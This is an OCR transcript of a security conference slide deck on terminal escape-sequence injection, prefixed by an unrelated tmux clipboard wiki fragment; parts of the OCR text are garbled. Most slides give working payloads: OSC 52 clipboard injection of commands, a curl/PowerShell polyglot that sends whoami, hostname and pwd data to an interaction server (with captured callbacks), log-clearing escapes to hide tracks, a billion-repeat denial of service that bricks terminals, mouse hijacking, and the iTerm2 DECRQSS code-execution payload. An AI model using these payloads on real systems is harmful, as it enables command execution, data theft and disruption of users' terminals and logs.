1‘) Pullrequests 7 (2) Discussions ©) Actions 1] Wiki © Security | Insights
Clipboard
Nicholas Marriott edited this page on Jun 15, 2022 - 53 revisions 5
The clipboard
It is common to want to have text copied from tmux's copy made or with the mouse in tmux synchronized with the
system clipboard. The tools offered to tmux by terminals to do this are quite blunt and not consistently supported. This
document gives an overview of how things work and some configuration examples.
There are two posible methods:
e OSC 52 and the set-clipboard option.
e Piping to an external tool like xsel .
Note that tmux should be restarted entirely (run tmux kill-server ) after making changes to .tmux.conf .
The set-clipboard option
How it works
Some terminals offer an escape sequence to set the clipboard. This is one of the operating system control sequences
so it is known as OSC 52.
To skip the details and read quick step-by-step instructions on configuring set-clipboard , skip to this section.
```

## Slide 81

#### **OSC52 CLIPBOARD INJECTION**

\```
printf '\033]52;c;base64string\007'
b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK
open -a calculator.app \n
\```

## Slide 82

##### **ZSH OSC52**

`printf '\033]52;c;base64string\007' b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK open -a calculator.app` **ZSH REQUIRES USER INTERACTION (PRESS ENTER)**

## Slide 83

##### **ZSH OSC52**

\```
printf '\033]52;c;base64string\007'
b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK
\```

\```
open -a calculator.app
\```


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
stok@STOKs-MBP:~/Documents
Documents printf '\033]52;c;b3BLbiAtYSBj YWxjdWxhdGSyLmFwcAok\ 007 '
Documents open -a calculator.app
Documents [|
```

## Slide 84

**BASH OSC52**

\```
printf '\033]52;c;base64string\007'
b3BlbiAtYSBjYWxjdWxhdG9yLmFwcAoK
open -a calculator.app
\```

###### **BASH DONT.**

## Slide 85

#### **OSC52 CLIPBOARD INJECTION** `printf '\033]52;c;c2xlZXAgMQplY2hvIEhlbGxvICQod2hvYW1pKQoK\007'`

\```
sleep1 \r\n
echo Hello $(whoami) \r\n
\r\n
\```

## Slide 86

##### **OSC52**

\```
printf '\033]52;c;c2xlZXAgMQplY2hvIEhlbGxvICQod2hvYW1pKQoK\007'
\```

\```
sleep1 \r\n
echo Hello $(whoami) \r\n
\r\n
\```

**DIFFERENT TERMINALS BEHAVE IN DIFFERENT WAYS**

## Slide 87

##### **XSS/NIX/WIN POLYGLOT-ISH**

\```
\n\n\n\n\n\n
data:image/
svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53
My5vcmcvMjAwMC9zdmciPgogIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgIGFsZXJ0KCJpbmplY3R
pb24gc3VjY2Vzc2Z1bCIpOwogIDwvc2NyaXB0Pgo8L3N2Zz4=#\n
\```

\```
curl "http://$(whoami).$(hostname).rcepoc.127.0.0.1.nip.io/$(pwd | base64)"\n
cmd /c powershell -Command "$URI = 'http://%username%.
%computername%.rcepoc.127.0.0.1.nip.io/';Invoke-WebRequest -Uri $URI"\n
\```

## Slide 88

#### **OSC52 CLIPBOARD INJECTION**

\```
printf
'\033]52;c;CgoKCgpkYXRhOmltYWdlL3N2Zyt4bWw7YmFzZTY0LFBITjJaeUIyWlhKemFXOXVQU0l4TGpFaUlH
SmhjMlZRY205bWFXeGxQU0ptZFd4c0lpQjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl
6ZG1jaVBnb2dJRHh6WTNKcGNIUWdkSGx3WlQwaWRHVjRkQzlxWVhaaGMyTnlhWEIwSWo0S0lDQWdJR0ZzWlhKME
tDSnBibXBsWTNScGIyNGdjM1ZqWTJWemMyWjFiQ0lwT3dvZ0lEd3ZjMk55YVhCMFBnbzhMM04yWno0PSMKCmN1c
mwgImh0dHA6Ly8kKHdob2FtaSkuJChob3N0bmFtZSkucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJChwd2QgfCBi
YXNlNjQpIgoKY21kIC9jIHBvd2Vyc2hlbGwgLUNvbW1hbmQgIiRVUkkgPSAnaHR0cDovLyV1c2VybmFtZSUuJWN
vbXB1dGVybmFtZSUucmNlcG9jLjEyNy4wLjAuMS5uaXAuaW8vJztJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRVUk
kiCg==\007' > badlog.log
\```

## Slide 89

**POLYGLOT?**


> Recovered by OCR — confidence 84/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Collaborator
bash-3.2$
bash: data:image/svg+xml: No such file or directory
=#: command not found
bash-3.2$
k3quek29.oastify.com/$(pwd | base64)"'
bash-3.2$ cmd /c powershell -Command "S$URI = ‘http: //%username%S.%computernam
e%. rcepoc.idz9guqceiehzubwq7v9rp3ck3quek29. castify.com/';Inveke-WebRequest -
Uri SURI"
bash: cmd: cammand not found
bash-3.2$ []
Headers {[X-Collaborator—-Version, 4], [Age, 9],
Images 3 lb
ParsedHtmL : System.__ComObject @ images
RawContentLength : 55
@ Volumes Logs
S Dev Environments (BETA / #
Payloads tog... | 1
#4 Time
2023-Jul-13 13:19:53.925 UTC
2023-Jul-13 13:19:54.245 UTC
2023-Jul-13 13:19:57.176 UTC
2023-Jul-13 13:19:57.175 UTC
2023-Jul-13 13:19:57.445 UTC
2023-Jul-13 13:20:00,588 UTC
2023-Jul-13 13:20:00.588 UTC
2023-Jul-13 13:20:00.968 UTC
Description Request to Collaborator
Raw Hex
1 GET /Lwo= HTTP/1.1
2 Host:
Type
DNS
HTTP
DNS
DNS
HTTP
DNS
DNS
HTTP
¥ Include Collaborator server location
Payload
idz9guqceiehzubwq7v9rp3cksquek29
Response from Collaborator
— ie
Inspector
Q
Poll now Polling autorr
Source |
188.126.80.54
188.126.80.54
188.126.80.54
188.126.80.54
188.126.80.54
Request attributes 2 vi
root.2e0348d7 fed4. rcepoc. idz9guqceiehzubwq7v9rp3ck3quek29. oast
ify.com
3 User-Agent: curl/7.86.6
4 Accept: */*
(OKC € > Search...
Inspect Terminal Files
Stats
Request headers
0 highlights
Open in external terming
This page says
injection successful
Q 0
v
OK
JyaXBOPgo8L3N
'z4=#: not fo
```

## Slide 90

**MESS THINGS UP!**

## Slide 91

**HIDE YOUR TRACKS** `printf '\033[H\007' - Moves cursor to home position (0, 0) printf '\033]1337;ClearScrollback\007' - Clears scrollback(iterm) Printf '\033[2J\007’ - Erase entire screen`

**https://gist.github.com/fnky/458719343aabd01cfb17a3a4f7296797**

## Slide 92

**CLEARS THE LOG EVERY TIME IT RENDERS**


> Recovered by OCR — confidence 76/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ @ @ Docker Desktop Update to latest Q. Search for local and remote images, containers, and more... = Sign in fe)
affectionate_chandrasekhar
docker/getting-started STATUS
2e0348d7fed4 0 gl Sag
@ Containers
@m Volumes Logs Inspect Terminal Files Stats
(A Dev Environments (BETA "failed (2:_No such file or directory), client: _172.17.9.1,_server:_ localhost, request: "GET /tutorial/ Qneg b
2 Learning Center
Extensions 5
wy Resource usage
© seeseners CLEARS THE LOG EVERY TIME IT RENDERS
@ 404 Not Found re ee RAM4.16GB CPU0.20% Disk 47.53 GB avail. of 58.37 GB 4 Not connected to Hub @ v4.19.0 0
404 Not Found
nginx/1.23.3
```

## Slide 93


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Dictionary
Definitions from Oxford Languages - Learn more
© annoy
verb
1. make (Someone) a little angry; irritate.
"the decision really annoyed him"
Similar: _ irritate vex make angry make cross anger exasperate irk ov
2. ARCHAIC
harm or attack repeatedly.
"a gallant Saxon, who annoyed this Coast"
```

## Slide 94

**DOS / BRICK**

## Slide 95


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
invisible-island.net
CSI Ps i Media Copy (MC).
= Print screen (default).
Turn off printer controller mode.
Turn on printer controller mode.
= HTML screen dump, xterm.
= SVG screen dump, xterm.
CSI ? Psi
Media Copy (MC), DEC-specific.
Ps = Print Line containing cursor.
Ps = Turn off autoprint mode.
Ps = Turn on autoprint mode.
Ps @ = Print composed display, ignores DECPEX.
Ps 1 = Print all pages.
CSI Pm lt Reset Mode (RM).
Ps = 2 = Keyboard Action Mode (KAM).
Ps = Replace Mode (IRM).
Ps 2 = Send/receive (SRM).
Ps @ = Normal Linefeed (LNM).
4
1
2
DEC Private Mode Reset (DECRST).
Ps = Normal Cursor Keys (DECCKM), VT10@.
Ps Designate VT52 mode (DECANM), VT1@@.
8@ Column Mode (DECCOLM), VT120.
Jump (Fast) Scroll (DECSCLM), VT1@0.
Normal Video (DECSCNM), VT10@.
Ps
Ps
```

## Slide 96

**POPS A PRINT JOB**


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
& invisible-island.net
CSI Ps i Media Copy (MC).
Ps = @ = Print screen (default).
Ps = Turn off printer controller
Ps = Turn on printgm
Ps = HTML screen
Ps = SVG screen
stok@stoks-mbp:~/Documents/terminal
terminal Printf '\o33[oi\o087'
POPS A PRINT JOB
Page 1 of 1
Jump (Fast)
Normal Video
Copies
Pages
® All Pages
Range from 1 to
Selection
Select pages from the sidebar
Paper Size
Orientation
Scaling
iTerm2
v
& No Printer Selected ¢
None ¢
A4 210 by 297 mm
® +(2) Portrait +) Landscape
Black and white
Cancel
```

## Slide 97

##### **PRINT STUFF**

\```
Printf '\033[0i\007'
Print onscreen stuff
Printf '\033[5i\007'
Send output to printer (BRICK iTERM2)
\```

**SENDS ALL OUTPUT TO A NON EXISTING PRINTER**

## Slide 98

**REALLY ANNOYING**

## Slide 99

###### **HIJACK MOUSE**

\```
printf '\033[?1001h\033[?1002h\033[?1003h\033[?1004h\033[?
1005h\033[?1006h\033[?1007h\033[?1015h\033[?10016h\'
\```

## Slide 100

**HIJACK MOUSE**

\```
printf '\033[?1001h\033[?1002h\033[?1003h\033[?1004h\033[?
1005h\033[?1006h\033[?1007h\033[?1015h\033[?10016h\'
\```

###### **EVERY SINGLE MOUSE MOVEMENT WILL BE REPORTED**

## Slide 101


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
8 invisible-island.net FE] w
(See discussion of Title Modes).
Erase Ps Character(s) (default = 1) (CECH).
Cursor Backward Tabulation Ps tab stops (default = 1) (CBT).
Scroll down Ps Lines (default = 1) (SD), ECMA-48.
This was a publication error in the original ECMA-48 5th
edition (1991) corrected in 20@3.
Character Position Absolute [column] (default = [row,1])
(HPA).
Character Position Relative [columns] (default = [row,col+1])
CHPR).
Repeat the preceding graphic character Ps times (REP).
Send Device Attributes (Primary DA).
Ps = @ or omitted = request attributes from terminal. The
response depends on the decTerminalID resource setting.
> CSI 7 ; 2c (C"VT10@ with Advanced Video Option")
CSI 7 ; @c (C"VT101 with No Options")
CST 7 ; 6 c ("VT132 with Advanced Video and Graphics")
CSI 7 ("VT102")
```

## Slide 102

**REPEAT THE PRECEDING GRAPHIC CHARACTER X TIMES (REP)** `printf '` ✌ `\033[10;b\007'`

## Slide 103

###### **REPEAT THE PRECEDING GRAPHIC CHARACTER X TIMES (REP)**

`printf '` ✌ `\033[10;b\007'` ✌ ✌ ✌ ✌ ✌ ✌ ✌ ✌ ✌

## Slide 104

###### **REPEAT THE PRECEDING GRAPHIC CHARACTER X TIMES (REP)**

`printf '` ✌ `\033[1000000000;b\007'`

\```
1.000.000.000 = ONE BILLION
\```

## Slide 105

**REPEAT THE PRECEDING GRAPHIC CHARACTER X TIMES (REP)** `printf '` ✌ `\033[1000000000;b\007'`

✌

✌

✌

✌

✌

✌

✌

✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌
✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌✌

✌

✌

✌

✌

✌

✌

✌

## Slide 106

**DO NOT RUN THIS IN PROD! THINGS WILL BREAK AND YOU WILL NEED TO CLEAN THE LOGFILES**

## Slide 107

###### `curl localhost/hello✌%ef%b8%8f%1b%5b1000000000%3bb%07`

**BRICKED**


> Recovered by OCR — confidence 76/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ @ @ Docker Desktop Upgrade plan Q. Search for local and remote images, containers, and more... 38K &% & Sinn @
affectionate_chandrasekhar
@ containers é docker/getting-started STATUS >
@ 2e0348d7fed4 F Running (7 minutes ago)
@ Volumes Logs Inspect Terminal Files Stats
@_ Learning Center
Extensions =
wy Resource usage
@) Add Extensions
```

## Slide 108

###### **BRICKED BRICKED CRASHED BRICKED TRY IT YOURSELF AT https://evil.terminalinjection.com/dos**


> Recovered by OCR — confidence 79/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
+> Documents printf ' §033[1000000000;b\007'
@ @ @ Docker Desktop Upgrade plan Q Search for local and remote images, containers, and more... #K & & Signin €
® Containers < ® docker/getting-started STATUS >
2e0348d7fed4 © Running (2 minutes ago)
@ Images 80:80 @
@ Volumes Logs Inspect Terminal Files Stats external terminal @
—) Dev Environments (BETA
@D_Learning Center / # printf '@e33[1900000000;b\007'
e .
Extensions 5
@) Add Extensions
PROBLEMS OUTPUT
RAM 4.16 GB Disk 47.53 GB avail. of 58.37 GB Not connected to Hub |
a]
BRICKED
TRY IT YOURSELF AT https://evil.ter
```

## Slide 109

**DAVID LEADBEATER**

## Slide 110

##### **DAVID LEADBEATER**

**BlueHat 2023: Houdini of the Terminal with David Leadbeater https://www.youtube.com/watch?v=iIHw0KWgzAs**

## Slide 111

##### **DAVID LEADBEATER**

**BlueHat 2023: Houdini of the Terminal with David Leadbeater https://www.youtube.com/watch?v=iIHw0KWgzAs**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DAVID LEADBEATER
CRLF injection vulnerability in xterm allows user-assisted attackers to execute arbitrary commands via LF (aka \n)
characters surrounding a command name within a Device Control Request Status String (DECRQSS) escape sequence in
BlueHat 2023: Houdini of the Terminal with David Leadbeater
https://www.youtube.com/watch?v=ilHwOKWgzAs
```

## Slide 112

**DAVID LEADBEATER**


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DAVID LEADBEATER
= README.md
CVEs
This primarily targets Kubectl's CVE-2021-25743. It needs to be combined with a terminal vulnerability to
have any effect though. Some examples are:
\ ~— * xterm font OSC ( 2022-45063)
e iTerm2 DECRQSS (CVE-2022-45872)
. "\eP$q;open —a Calculator\r\e\\\eP$q\e\\"
David Leadbeater
dg
ConEmu title (CVE-2022-46387)
Follow
Windows Terminal WSL directory (C\ y 702)
Observability, Go and Perl. Sometimes
IRC. Always emoji. "\e]9595/" calc-exe “o /\eX\\"
24 97 followers - 0 followin Some colour (not a terminal vulnerability, test for CVE-2021-25743 alone)
Eh @G-R h "\e[3lmIf you see this in red your kubectl is not fixed against CVE-2021-25743\e[m"
Eb -Researc
*) Melbourne, Australia The list above contains escape sequences in C-style strings, as this section of the readme is expanded and
(0) 03:32 - 8h ahead written to /dev/termination-log, see skerfile.
ey nttps:/jaglicx Note the last entry is not a terminal vulnerability, but an attacker could still use it in an attempt to social
W @davidgl engineer the administrator, e.g. change something else on screen (cursor movement sequences means they
@ @dg!@infosec.exchange can change lines above where the text is actually output).
```

## Slide 113

**DAVID LEADBEATER**


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DAVID LEADBEATER
Terminally Owned - 60 years of escaping
David Leadbeater
Caesars Forum - Forum - 109-119, 138-139 (Track 2)
DEF CON Official Talk
Sun, Aug 13 12:00-12:45 PDT E%
It is 60 years since the first publication of the ASCII
standard, something we now very much take for
granted. ASCII introduced the Escape character;
something we still use but maybe don't think about
very much. The terminal is a tool all of us use. It's a
way to interact with nearly every modern operating
system. Underneath it uses escape codes defined
in standards, some of which date back to the
1970s.
In this talk I'll look at the history of terminals and
then detail the issues | found in half a dozen
different terminals. Even Microsoft who historically
haven't had strong terminal support didn't escape
a CVE. In order to exploit these vulnerabilities they
often need to be combined with a vulnerability in
something else. I'll cover how to exploit these
vulnerabilities in multiple ways.
Overall this research found multiple remote code
execution vulnerabilities across nearly all platforms
and new unique ways to deliver the exploits.
```

## Slide 114

**iTERM2 DECRQSS RCE** `curl http://localhost:80/sup%0a%1B%5B31mESC-INJECTION-SUCCESSFULLETS-POP-CALC%1B%5B0m%07%0a%1bP%24qm%03%1b%5c%1bP%24qm%3bopen%20a%20calculator%3b%0d%1b%5c%1bP%24qm%1b%5c` **CVE-2022-45872 - DAVID LEADBEATER**

## Slide 115

**iTERM2 DECRQSS RCE** `curl http://localhost:80/sup%0a%1B%5B31mESC-INJECTION-SUCCESSFULLETS-POP-CALC%1B%5B0m%07%0a%1bP%24qm%03%1b%5c%1bP%24qm%3bopen%20a%20calculator%3b%0d%1b%5c%1bP%24qm%1b%5c` **CVE-2022-45872 - DAVID LEADBEATER**

## Slide 116


> Recovered by OCR — confidence 89/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
affectionate_chandrasekhar
docker/getting-started
@® Containers
@ images
@ Volumes
Stats
Logs Inspect Terminal Files
i) Dev Environments (BETA 172.17.0.1 - - [10/Ju1/2023:08:40:00 +0000]
) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Ju1/2023:08:40:00 +0000]
6 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/JuL/2023:08:40:00 +0000]
e . Kit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Ju1/2023:08:40:00 +0000]
{537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
@D Learning Center
Extensions
iP Resource usage
x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
STATUS
Running (4 minutes ago)
"GET ftutorial/ HTTP/1.1" 200 14807 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53° Q o © i <0)
"GET fassets/fonts/font-awesome.css HTTP/1.1" 200 30721 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.3
"GET /assets/fonts/font-awesome.css HTTP/1.1" 200 30721 "http://127.0.0.1/tutorial/" "“Mozilla/S.0 (Windows NT 10.0; Win64; x64) AppleWeb
"GET fimages/docker -labs-loga.svg HTTP/1.1" 200 6469 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit
172.17.0.1 - - [10/Ju1/2023:08:40:00 +0000] "GET /assets/javascripts/application.c33a9706. js HTTP/1.1" 200 79589 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64;
172.17.0.1 - - [10/Ju1/2023:08:40:00 +0000] "GET /tutorial/tutorial-in-dashboard.png HTTP/1.1" 200 109800 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Ap
@) Add Extensions
eee
> Documents docker logs --follow --tail 10
stok@STOKs-MacBook-Pro:~/Documents
Getting Started
Getting Started
Getting Started
Our Application
Updating our App The command you just ran
Sharing our App
Congratulations! You have started the container for this tutorial! Let's first explain the command
that you just ran. In case you forgot, here's the command:
Persisting our DB
Using Bind Mounts
(Windows
WebKit/53
iTerm2
$ By George Nachman and Contributors
Build 3.4.17
What's New in 3.4?
Home Page - Report a bug - Credits
%KShain Singh, Yewildsands¥, Ye Yvon Letourneau, A. J. Wright, Adam, Adam Wiggins, Al
Payne, Alan Graham, Aleksei Besogonov, Alex Parella, Alex Pearce, Alexey Palazhchenko, allen
joslin, Andreas Wolff, Andrew Canaday, Andrew Imeson, Andrew Wang, angelus2014, Annette,
anthroid, Artem Pyanykh, Avrios, Ben Nied, Benson Kalahar, Blake Williams, Bret Martin, Brett
Terpstra, Brian Gupta, Buttondown, Cale Winebrenner, cashdeck, Chihiro SAKATOKU, Chip, Chip
Salzenberg, Chris Faehl, Chrissy Gage, Colin Marc, Dale Bradshaw, Dave Bayer, David Avakian,
David Bayer, David Cuthbert, David Mankin, Dylan Arbour, Ean Price, Elijah Miller, Emily St*, Eoin
Woods, Federico Marzocchi, Frank Fejes, Frédéric Harper, G Douglas Davidson, Gary Bernhardt,
Geoffrey Washburn, Gordon Child, HJ, Horia Dragomir, ihaveahax, Jacob Lambert, James Brown,
Jan Zenkner, Jason Weddington, Jeffrey Honig, Jeremy, Joe Gallo, John Shearar, John Weir, Jon
Nall, Jon Seidel, Jonathan Zuckerman, Joseph Diehi, Jussi Arpalahti, Justin Duke, Justin Pfifer, Karl
Bunch, kdkd, Kenichi Kamiya, Kenneth Roszkowski, Kevin Shay, Konrad Malawski, Lasse Osterild,
Luc Suryo, Mal McKay, Marcel van den Hof, Mark H Berger, Mark Higham, Mark Mann, Mark Rinella,
Martin Kluska, Matt Schrage, Matthew Hirst, Matthew P. C. Morley, Mauricio Novelo, Max Horn,
Michael O'Brien, Mikkel Malmberg, mimacom, Namho Kim, Oduah Tobi, Oladapo Fadeyi, Oleg
Evdokimov, Oleksandr Tymoshenko, Olga Akhrameeva, Oliver B. Fischer, Ondfej Sury, otomiko2,
```

## Slide 117


> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Docker Desktop —_ Update to latest Q Search for local and remote images, containers, and more...
Containers STATUS
Running (54 minutes ago)
Images
Volumes Inspect Terminal
Dev Environments (BETA 172.17.0.1 - - [10/Ju1/2023:09:30:57 +0000] "GET /tutorial/our-application/dashboard-two-containers.png HTTP/1.1" 200 249953 "http://Localhost/tutorial/our -ay Qo OF = 5
-© (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-" ‘ D ‘C) [|
Learning Center 172.17.0.1 - - [10/Ju1/2023:09:31:00 +00001 "GET /tutorial/updating-our-app/ HTTP/1.1" 200 17460 "http://Localhost/tutorial/our-application/" "Mozilla/5.0 (Windows NT 10.0; Win64;
x64) AppleWebKit @ @ @ ome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [ T /tutorial/updating-our-app/todo-list-updated-empty-text.png HTTP/1.1" 200 25368 "http://localhost/tutorial/updating-our-app/" "Mozi
Lla/5.8 (Windows @ it/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-'
172.17.0.1 - - [ /tutorial/updating-our-app/dashboard-removing-container.png HTTP/1.1" 200 284927 "http://localhost/tutorial/updating-our-app/" "Moz
— illa/5.0 (Window it/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
47 Resource usage 2023/07/10 09:3 AC % fusr/share/nginx/html/sup
Extensions
172.17.0.1, server: localhost, request: "GET /sup%03%1B%5B31mESC- INJECTION - SUCCESSFUL -LETS - POP - CALC%1B%5B0m%07%0a%1bP%24qm%03%1b%5C
%1bP%24qm%3boper 7 bP%24qm%1b%5c HTTP/1.1", host: "Localhost"
172.17.0.1 - - /sup%03%1B%5B31mESC- INJECTION - SUCCESSFUL -LETS - POP - CALC%1B%5B0m%07 %0a%1 bP%24qm%03%1b%5C%1 bP%24qm%3bopen%20 - a%20ca Lculator%3b%Od%1b%5S
C%1IbP%24qm%1b%5 4 i 5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
@ Add Extensions fatled (2: No
2023/07/10 09:3 /usr/share/nginx/htmL/favicon.ico" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /favi
con.ico HTTP/1.
Lator%3b%0d%1b%5
172.17.0.1 - - [
‘http: //LocalLhost/sup%0a%1B%5B31mESC - INJECTION - SUCCESSFUL -LETS - POP -CALC%1B%5B0m%07%0a%1bP%24qm%03%1b%5C%1bP%24qm%3bopenk20 - a%2Ocalcu
%1bP%24am%1b%S5c"_"Mozilla/S.@ (Windows NT 10.0: Win64: x64) AnpleWebKit/537.36 (KHTML. Like Gecko) Chrome/114.0.5735.199 Safari/537
@ 404 Not Found x +
2023/07/10 09:31:04 Lerror] 22#22: *102 open{) “/usr/share/n
ESC-INJECTIGN-SUCCESSFUL-LETS-POP-CALC
" failed (2: No such file or directory), client: 172.17.0.1,
.1", host: "LocaLlhost"
172.17.0.1 - - |10/Ju1/2023:609:31:04 +6000] "GET /sup%0a%1B%
3 Win64; x64) AppleWebkit/537.36 (KHTML, Like Gecko) Chrome/
AcPSqmsopen -a calculator;
>» Documents P$qm;open -a calculator;
zsh: command not found: P
+ Documents P$ani |
nginx/1.23.3
```

## Slide 118

\```
printf '\033P$qm\x03\033\\'
printf '\033P$qm;open -a calculator;\r\n\033\\'
printf '\033P$qm\033\\'
\```


> Recovered by OCR — confidence 81/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
172.17.0.1 - - Gee) «6 {favicon.ico HTTP/1.1" 404 5
@ 404 Not Fi
2023/07/10 09:31:04 [error] 22#22: *102 open() "/usr/share/ngs
" failed (2: No such file or directory), client: 172.17.0.1,
.1", host: "Localhost"
172.17.0.1 - - [10/JuL/2023:09:31:04 +0000] "GET /sup%0a%1B%5
Win64; x64) AppLeWebKit/537.36 (KHTML, Like Gecko) Chrome/!
ACPSqm;open -a calculator;
+ Documents PS$qm;open -a calculator;
zsh: command not found: P
+> Documents PSqin
```

## Slide 119

\```
printf '\033P$qm\x03\033\\
printf '\033P$qm;open -a calculator;\r\n\033\\'
printf '\033P$qm\033\\'
\```


> Recovered by OCR — confidence 73/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
172.17.0.1 - - fee) «=6/favicon.ico HTTP/1.1" 404 5
%5C%1bP%24qm%3 be c%1bP%24am%1b%5c"_ "Mozilla/S.|
@ 404 Not Fi
RAM 5.54GB CPU 0.4 4 GB avail SB ON « > © — @® localhos
2023/07/10 [P9:31:04 [error] 22#22: *102 open() "/usr/share/ngs
ESC-INJECT FON-SUCCESSFUL-LETS-POP-CALC
" failed (ff: No such file or directory), client: 172.17.0.1,
172.17.0.9 - - [10/Jul/2023:09:31:04 +0000] "GET /sup%0a%1B%5
; Win64; Y%64) AppleWebkKit/537.36 (KHTML, Like Gecko) Chrome/!
ACPSqm;open -a calculator;
+ Documents PS$qm;open -a calculator;
zsh: command not found: P
+> Documents PSqin
```

## Slide 120

\```
printf '\033P$qm\x03\007
printf '\033P$qm;open -a calculator;\r\n\033\\'
printf '\033P$qm\033\\'
\```


> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
172.17.0.1 - - Gee) «6 {favicon.ico HTTP/1.1" 404 5
@ 404 Not Fi
2023/07/10 09:31:04 [error] 22#22: *102 open() "/usr/share/ngs
" failed (2: No such file or directory), client: 172.17.0.1,
.1", host: "Localhost"
172.17.0.1 - - [10/JuL/2023:09:31:04 +0000] "GET /sup%0a%1B%5
- Win64; x64) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/:!
CPS$qm;open -a calculator;
+ Documents PS$qm;open -a calculator;
zsh: command not found: P
+> Documents PSqin
=> printf '\033PSqm\033\\'
```

## Slide 121

\```
printf '\033P$qm\x03\007
printf '\033P$qm;open -a calculator;\r\n\033\\'
printf '\033P$qm\033\\'
\```


> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
172.17.0.1 - - Gee) «6 {favicon.ico HTTP/1.1" 404 5
@ 404 Not Fi
2023/07/10 09:31:04 [error] 22#22: *102 open() "/usr/share/ngs
" failed (2: No such file or directory), client: 172.17.0.1,
.1", host: "Localhost"
172.17.0.1 - - [10/JuL/2023:09:31:04 +0000] "GET /sup%0a%1B%5
; Win64; x64) AppleWebkKit/537.36 (KHTML, Like Gecko) Chr
ACPSqm;open -a calculator;
+ Documents PS$qm;open -a calculator;
zsh: command not found: P
+> Documents PSqin
```

## Slide 122

##### **OSC5113 - KITTY FILETRANSFER OVER TTY**

\```
printf '\033]5113;ac=send;id=test;n=aGVsbG8udHh0;sz=3;d=AQID\\'
\```


> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OSCS5113 - KITTY
FILETRANSFER OVER TTY
printf '\033]5113;ac=send; id=test;n=aGVsbG8udHh0;sz=3;d=AQID\\'
00 File transfer over the TTY
>_ There are sometimes situations where the TTY is the only convenient pipe between two
connected systems, for example, nested SSH sessions, a serial line, etc. In such scenarios, it is
useful to be able to transfer files over the TTY.
```

